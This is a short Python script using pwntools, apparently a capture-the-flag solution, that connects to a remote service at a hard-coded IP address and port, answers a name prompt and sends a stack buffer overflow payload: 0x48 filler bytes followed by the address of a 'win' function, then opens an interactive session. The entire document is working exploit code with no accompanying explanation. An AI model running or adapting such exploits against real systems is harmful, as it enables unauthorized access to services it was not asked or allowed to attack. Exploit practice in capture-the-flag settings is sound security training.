from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31780)
r.recvuntil(b"name? ")
r.sendline(b"AAAA")
r.recvuntil(b"day? ")

win_addr = 0x401236
payload = b"A" * 0x48 + p64(win_addr)
r.sendline(payload)
r.interactive()
